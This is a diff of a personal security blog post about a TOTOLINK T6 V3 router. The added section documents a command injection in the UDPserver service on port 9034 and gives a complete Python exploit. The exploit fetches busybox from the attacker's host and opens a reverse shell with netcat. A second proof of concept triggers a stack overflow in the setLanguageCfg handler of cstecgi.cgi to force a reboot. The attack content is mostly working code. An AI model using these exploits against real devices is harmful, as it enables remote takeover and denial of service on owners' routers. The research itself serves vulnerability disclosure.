@@ -1,8 +1,9 @@
 ---
 
-title: 'Getting root shell on TOTOLINK T6 V3'
+title: 'A journey with TOTOLINK T6 V3'
 published: 2025-06-25
-description: 'Updating the password during boot time is not enough !!'
+updated: 2025-07-08
+description: 'This is my journey with this "mesh" !!'
 image: 'pics/device.png'
 tags: ['Blogs', 'IoT', 'Router']
 category: 'Blogs'
@@ -137,3 +138,130 @@ if res.status_code == 200:
 ```
 
 ![](pics/get_shell.png)
+
+## Finding bug
+
+### UDPserver
+With root shell, I able to use command like `ps` to watch the process tree. But for more "powerful" command, I push a new `busybox` that has more command than the older.<br>
+I use `netstat` to view all listen port and what binary listen on those port. The `UDPserver` listen on port `9034`. Lets look at it.
+
+```
+udp        0      0 0.0.0.0:53              0.0.0.0:*                           1656/dnsmasq
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           1404/udhcpd
+udp        0      0 0.0.0.0:9034            0.0.0.0:*                           972/UDPserver
+```
+
+In the `main` function, I can see it try to `recvfrom` socket, compare with some string like `orf`, `irf`,... Then use `strcat` to complete the command and pass it to `command`. We can inject our command easily. 
+
+![](pics/updserver_func.pngpng)
+
+So I write a script for it:
+
+```python
+import sys, socket, http.server, socketserver, threading, time
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        super().do_GET()
+
+def start_server(PORT = 8000):
+    Handler = MyHandler
+    httpd = socketserver.TCPServer(("", PORT), Handler)
+    
+    print("Serving on port %d" % PORT)
+    httpd.serve_forever()
+
+def start_http_server():
+    server_thread = threading.Thread(target=start_server)
+    server_thread.daemon = True
+    server_thread.start()
+
+    print("Server is running in the background...")
+
+def exploit(target_ip, my_ip):
+    UDP_IP = target_ip
+    UDP_PORT = 9034
+    CMD = f'''
+    orf; wget http://{my_ip}:8000/busybox -O /tmp/busybox; chmod +x /tmp/busybox; /tmp/busybox nc {my_ip} 1943 -e /bin/sh
+    '''
+    print("UDP target IP:", UDP_IP)
+    print("UDP target port:", UDP_PORT)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto(bytes(CMD, "utf-8"), (UDP_IP, UDP_PORT))
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("[-] Usage: <%s> target_ip my_ip" % sys.argv[0])
+        exit(0)
+    
+    target_ip = sys.argv[1]
+    my_ip = sys.argv[2]
+
+    start_http_server()
+
+    print("[+] You should start nc -lvnp 1943")
+    exploit(target_ip, my_ip)
+
+    while True:
+        time.sleep(1)
+```
+
+Here is the result:
+
+![](pics/udpserer_shell.png)
+
+### BOF -> DDOS
+We back to `cstecgi.cgi`, in the function at address `0x41f404` (this is the handler for `setLanguageCfg`). First the program parse 2 argv from `POST` request, then it check file `/var/userdata/product.ini` is exist, then the program will create a string from hardcoded string `helpUrl_` and our argv. 
+
+![](pics/setlangcfg_func.PNG)
+
+But the command_variable on stack only `256` bytes, so we can overflow and overwrite the `ret_addr`. But we cant send `00` bytes, so the only thing we can control is last 3 bytes of `ret_addr`. I tried to find some helpful gadgets to execute system, but I cant find anything (or yet !!). So I decided to return to `0x412acc - RebootSystem`, to make the system reboot. Here is the POC:
+
+```python
+import requests, sys, threading, os, time
+
+def send_post(target_ip):
+    url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"
+    print(url)
+
+    payload = b"A" * 332 + b"\xcc\x2a\x41"
+
+    data = b'''
+    {
+        "topicurl":"setLanguageCfg",
+        "lang":"%s",
+        "langAutoFlag":"sad POC"
+    }
+    ''' % (payload)
+
+    requests.post(url, data=data)
+    print("[*] Thread 1: Sent request...")
+
+def kill_script():
+    time.sleep(2)
+    print("[*] Thread 2: Killing the script...")
+    os._exit(0)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"[-] Usage: {sys.argv[0]} target_ip")
+        exit(0)
+
+    t1 = threading.Thread(target=send_post, args=(sys.argv[1],))
+    t2 = threading.Thread(target=kill_script)
+
+    t1.start()
+    t2.start()
+
+    t1.join()
+    t2.join()
+```
+
+Result:
+
+<video width="640" height="360" controls>
+  <source src="/blogs_file_attached\totolink_t6/ddos.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
